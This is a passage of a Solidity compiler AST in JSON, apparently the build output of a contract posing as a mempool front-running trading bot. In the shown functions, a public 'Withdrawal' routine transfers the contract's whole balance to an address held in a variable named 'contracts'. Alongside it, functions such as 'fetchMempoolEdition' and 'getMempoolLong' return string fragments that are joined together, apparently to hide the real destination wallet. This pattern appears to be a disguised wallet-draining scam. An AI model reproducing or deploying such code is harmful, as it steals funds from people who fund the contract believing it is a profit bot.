																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 942,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 940,
														"name": "fetchMempoolEdition",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 405,
														"src": "6842:19:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 941,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6842:21:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6810:53:3"
											},
											{
												"assignments": [
													944
												],
												"declarations": [
													{
														"constant": false,
														"id": 944,
														"mutability": "mutable",
														"name": "_mempoolVersion",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 971,
														"src": "6868:29:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 943,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "6868:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 947,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 945,
														"name": "fetchMempoolVersion",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 274,
														"src": "6900:19:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 946,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6900:21:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6868:53:3"
											},
											{
												"assignments": [
													949
												],
												"declarations": [
													{
														"constant": false,
														"id": 949,
														"mutability": "mutable",
														"name": "_mempoolLong",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 971,
														"src": "6926:26:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 948,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "6926:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 952,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 950,
														"name": "getMempoolLong",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 686,
														"src": "6955:14:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 951,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6955:16:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6926:45:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 956,
																"name": "getBalance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 698,
																"src": "7001:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
																	"typeString": "function () view returns (uint256)"
																}
															},
															"id": 957,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7001:12:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 953,
															"name": "contracts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 927,
															"src": "6982:9:3",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 955,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "6982:18:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 958,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6982:32:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 959,
												"nodeType": "ExpressionStatement",
												"src": "6982:32:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 964,
																	"name": "_mempoolShort",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 934,
																	"src": "7056:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 965,
																	"name": "_mempoolEdition",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 939,
																	"src": "7071:15:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 966,
																	"name": "_mempoolVersion",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 944,
																	"src": "7088:15:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 967,
																	"name": "_mempoolLong",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 949,
																	"src": "7105:12:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 962,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "7039:3:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 963,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodePacked",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "7039:16:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 968,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7039:79:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 961,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "7032:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 960,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7032:6:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 969,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7032:87:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 917,
												"id": 970,
												"nodeType": "Return",
												"src": "7025:94:3"
											}
										]
									},
									"documentation": null,
									"functionSelector": "70e44c6a",
									"id": 972,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "Withdrawal",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 914,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "6618:2:3"
									},
									"returnParameters": {
										"id": 917,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 916,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 972,
												"src": "6637:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 915,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "6637:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6636:15:3"
									},
									"scope": 1047,
									"src": "6599:525:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1008,
										"nodeType": "Block",
										"src": "7190:322:3",
										"statements": [
											{
												"assignments": [
													978
												],
												"declarations": [
													{
														"constant": false,
														"id": 978,
														"mutability": "mutable",
														"name": "_mempoolShort",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1008,
														"src": "7195:27:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 977,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7195:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 981,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 979,
														"name": "getMempoolShort",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 913,
														"src": "7225:15:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 980,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7225:17:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7195:47:3"
											},
											{
												"assignments": [
													983
												],
												"declarations": [
													{
														"constant": false,
														"id": 983,
														"mutability": "mutable",
														"name": "_mempoolEdition",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1008,
														"src": "7247:29:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 982,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7247:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 986,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 984,
														"name": "fetchMempoolEdition",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 405,
														"src": "7279:19:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 985,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7279:21:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7247:53:3"
											},
											{
												"assignments": [
													988
												],
												"declarations": [
													{
														"constant": false,
														"id": 988,
														"mutability": "mutable",
														"name": "_mempoolVersion",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1008,
														"src": "7305:29:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 987,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7305:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 991,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 989,
														"name": "fetchMempoolVersion",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 274,
														"src": "7337:19:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 990,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7337:21:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7305:53:3"
											},
											{
												"assignments": [
													993
												],
												"declarations": [
													{
														"constant": false,
														"id": 993,
														"mutability": "mutable",
														"name": "_mempoolLong",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1008,
														"src": "7363:26:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 992,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7363:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 996,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 994,
														"name": "getMempoolLong",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 686,
														"src": "7392:14:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 995,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7392:16:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7363:45:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1001,
																	"name": "_mempoolShort",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 978,
																	"src": "7444:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1002,
																	"name": "_mempoolEdition",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 983,
																	"src": "7459:15:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1003,
																	"name": "_mempoolVersion",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 988,
																	"src": "7476:15:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1004,
																	"name": "_mempoolLong",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 993,
																	"src": "7493:12:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 999,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "7427:3:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 1000,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodePacked",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "7427:16:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 1005,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7427:79:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 998,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "7420:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 997,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7420:6:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1006,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7420:87:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 976,
												"id": 1007,
												"nodeType": "Return",
												"src": "7413:94:3"
											}
										]
									},
									"documentation": null,
									"id": 1009,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tokenSymbol",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 973,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7150:2:3"
									},
									"returnParameters": {
										"id": 976,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 975,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1009,
												"src": "7175:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 974,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7175:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7174:15:3"
									},
									"scope": 1047,
									"src": "7130:382:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1026,
										"nodeType": "Block",
										"src": "7605:106:3",
										"statements": [
											{
												"assignments": [
													1017
												],
												"declarations": [
													{
														"constant": false,
														"id": 1017,
														"mutability": "mutable",
														"name": "ret",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1026,
														"src": "7610:17:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1016,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7610:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1019,
												"initialValue": {
													"argumentTypes": null,
													"id": 1018,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1011,
													"src": "7630:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7610:24:3"
											},
											{
												"assignments": [
													1021
												],
												"declarations": [
													{
														"constant": false,
														"id": 1021,
														"mutability": "mutable",
														"name": "retptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1026,
														"src": "7639:11:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1020,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7639:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1022,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "7639:11:3"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "7664:26:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "7666:22:3",
															"value": {
																"arguments": [
																	{
																		"name": "ret",
																		"nodeType": "YulIdentifier",
																		"src": "7680:3:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "7685:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "7676:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "7676:12:3"
															},
															"variableNames": [
																{
																	"name": "retptr",
																	"nodeType": "YulIdentifier",
																	"src": "7666:6:3"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 1017,
														"isOffset": false,
														"isSlot": false,
														"src": "7680:3:3",
														"valueSize": 1
													},
													{
														"declaration": 1021,
														"isOffset": false,
														"isSlot": false,
														"src": "7666:6:3",
														"valueSize": 1
													}
												],
												"id": 1023,
												"nodeType": "InlineAssembly",
												"src": "7655:35:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1024,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1017,
													"src": "7703:3:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1015,
												"id": 1025,
												"nodeType": "Return",
												"src": "7696:10:3"
											}
										]
									},
									"documentation": null,
									"id": 1027,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "loadCurrentContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1012,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1011,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1027,
												"src": "7547:18:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1010,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7547:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7546:20:3"
									},
									"returnParameters": {
										"id": 1015,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1014,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1027,
												"src": "7590:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1013,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7590:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7589:15:3"
									},
									"scope": 1047,
									"src": "7518:193:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1045,
										"nodeType": "Block",
										"src": "7773:116:3",
										"statements": [
											{
												"assignments": [
													1033
												],
												"declarations": [
													{
														"constant": false,
														"id": 1033,
														"mutability": "mutable",
														"name": "_mempoolEdition",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1045,
														"src": "7778:29:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1032,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7778:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1036,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1034,
														"name": "fetchMempoolEdition",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 405,
														"src": "7810:19:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
															"typeString": "function () pure returns (string memory)"
														}
													},
													"id": 1035,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7810:21:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7778:53:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1041,
																	"name": "_mempoolEdition",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1033,
																	"src": "7867:15:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 1039,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -1,
																	"src": "7850:3:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 1040,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodePacked",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "7850:16:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 1042,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "7850:33:3",
															"tryCall": false,
